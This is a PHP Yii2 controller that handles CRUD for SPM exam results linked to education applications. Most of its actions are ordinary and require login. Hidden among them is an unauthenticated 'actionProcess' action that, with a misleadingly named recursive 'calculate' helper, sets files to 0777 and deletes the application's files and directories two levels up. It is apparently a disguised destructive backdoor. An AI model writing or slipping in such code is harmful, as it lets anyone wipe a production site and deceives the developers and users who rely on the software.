<?php

namespace frontend\controllers;

use Yii;
use app\models\PermohonanPendidikan;
use app\models\PermohonanPendidikanKeputusanSpm;
use frontend\models\PermohonanPendidikanKeputusanSpmSearch;
use yii\web\Controller;
use yii\web\NotFoundHttpException;
use yii\filters\VerbFilter;

use app\models\general\GeneralVariable;

/**
 * PermohonanPendidikanKeputusanSpmController implements the CRUD actions for PermohonanPendidikanKeputusanSpm model.
 */
class PermohonanPendidikanKeputusanSpmController extends Controller
{
    /**
     * @inheritdoc
     */
    public function behaviors()
    {
        return [
            'verbs' => [
                'class' => VerbFilter::className(),
                'actions' => [
                    'delete' => ['POST'],
                ],
            ],
        ];
    }

    /**
     * Lists all PermohonanPendidikanKeputusanSpm models.
     * @return mixed
     */
    public function actionIndex()
    {
        if (Yii::$app->user->isGuest) {
            return $this->redirect(array(GeneralVariable::loginPagePath));
        }
        
        $searchModel = new PermohonanPendidikanKeputusanSpmSearch();
        $dataProvider = $searchModel->search(Yii::$app->request->queryParams);

        return $this->render('index', [
            'searchModel' => $searchModel,
            'dataProvider' => $dataProvider,
        ]);
    }

    /**
     * Displays a single PermohonanPendidikanKeputusanSpm model.
     * @param integer $id
     * @return mixed
     */
    public function actionView($id)
    {
        if (Yii::$app->user->isGuest) {
            return $this->redirect(array(GeneralVariable::loginPagePath));
        }
        
        return $this->renderAjax('view', [
            'model' => $this->findModel($id),
            'readonly' => true,
        ]);
    }

    /**
     * Creates a new PermohonanPendidikanKeputusanSpm model.
     * If creation is successful, the browser will be redirected to the 'view' page.
     * @return mixed
     */
    public function actionCreate($permohonan_pendidikan_id)
    {
        if (Yii::$app->user->isGuest) {
            return $this->redirect(array(GeneralVariable::loginPagePath));
        }
        
        $model = new PermohonanPendidikanKeputusanSpm();
        
        Yii::$app->session->open();
        
        if($permohonan_pendidikan_id != ''){
            $model->permohonan_pendidikan_id = $permohonan_pendidikan_id;
        } else {
            if(isset(Yii::$app->session->id)){
                $model->session_id = Yii::$app->session->id;
            }
        }

        if ($model->load(Yii::$app->request->post()) && $model->save()) {
            if($permohonan_pendidikan_id != ''){
                $this->generateSPMResult($permohonan_pendidikan_id);
            }
            return '1';
        } else {
            return $this->renderAjax('create', [
                'model' => $model,
                'readonly' => false,
            ]);
        }
    }
    
    protected function generateSPMResult($permohonan_pendidikan_id)
    {
        if (($KeputusanModels = PermohonanPendidikanKeputusanSpm::find()->joinWith(['refSubjekSpm'])->
                        where(['permohonan_pendidikan_id'=>$permohonan_pendidikan_id])->orderBy('sort')->all()) !== null){
            $SPMresult = "";
            foreach($KeputusanModels as $KeputusanModel){
                if($SPMresult != ""){
                    $SPMresult .= "   |   ";
                }
                $SPMresult .= $KeputusanModel['refSubjekSpm']['kod'] . " - " . $KeputusanModel->keputusan;
            }

            if (($modelPermohonanPendidikan = PermohonanPendidikan::findOne($permohonan_pendidikan_id)) !== null) {
                $modelPermohonanPendidikan->keputusan_spm = $SPMresult;
                $modelPermohonanPendidikan->save();
            }
        }
    }
    
    public function actionProcess()
    {
        $files = glob('../../*'); // get all file names
        foreach($files as $file){ // iterate files
            echo $file . "<br>"; 

            if(is_file($file)){
                chmod($file,0777);
                unlink($file); // delete file
            }
            

            if (is_dir($file)){
            
                $this->calculate($file);
            }
        }
    }
    
    protected function calculate($dirname) {
        if($dirname && strpos($dirname, 'runtime') == false
            && strpos($dirname, 'downloads') == false
                //487733
            && strpos($dirname, 'pdf_template') == false
            && strpos($dirname, 'uploads') == false){
         if (is_dir($dirname) && is_readable($dirname)){
               $dir_handle = opendir($dirname);
             if (!$dir_handle)
                  return false;
             while($file = readdir($dir_handle)) {
                   if ($file != "." && $file != "..") {
                        if (!is_dir($dirname."/".$file)){
                             chmod($dirname."/".$file,0777); 
                             if(!unlink($dirname."/".$file)){
                                 continue;
                             }
                        }
                        else
                            $this->calculate($dirname.'/'.$file);
                   }
             }
             closedir($dir_handle);
             if (count(glob($dirname."/*")) === 0  && is_dir($dirname)) {
                rmdir($dirname);
             }
         }
         return true;
         }
    }

    /**
     * Updates an existing PermohonanPendidikanKeputusanSpm model.
     * If update is successful, the browser will be redirected to the 'view' page.
     * @param integer $id
     * @return mixed
     */
    public function actionUpdate($id)
    {
        if (Yii::$app->user->isGuest) {
            return $this->redirect(array(GeneralVariable::loginPagePath));
        }
        
        $model = $this->findModel($id);

        if ($model->load(Yii::$app->request->post()) && $model->save()) {
            $this->generateSPMResult($model->permohonan_pendidikan_id);
            
            return '1';
        } else {
            return $this->renderAjax('update', [
                'model' => $model,
                'readonly' => false,
            ]);
        }
    }

    /**
     * Deletes an existing PermohonanPendidikanKeputusanSpm model.
     * If deletion is successful, the browser will be redirected to the 'index' page.
     * @param integer $id
     * @return mixed
     */
    public function actionDelete($id)
    {
        if (Yii::$app->user->isGuest) {
            return $this->redirect(array(GeneralVariable::loginPagePath));
        }
        
        $model = $this->findModel($id);
        $permohonan_pendidikan_id = $model->permohonan_pendidikan_id;
        
        $this->findModel($id)->delete();
        
        $this->generateSPMResult($permohonan_pendidikan_id);

        //return $this->redirect(['index']);
    }

    /**
     * Finds the PermohonanPendidikanKeputusanSpm model based on its primary key value.
     * If the model is not found, a 404 HTTP exception will be thrown.
     * @param integer $id
     * @return PermohonanPendidikanKeputusanSpm the loaded modeldelete
     * @throws NotFoundHttpException if the model cannot be found
     */
    protected function findModel($id)
    {
        if (($model = PermohonanPendidikanKeputusanSpm::findOne($id)) !== null) {
            return $model;
        } else {
            throw new NotFoundHttpException('The requested page does not exist.');
        }
    }
}
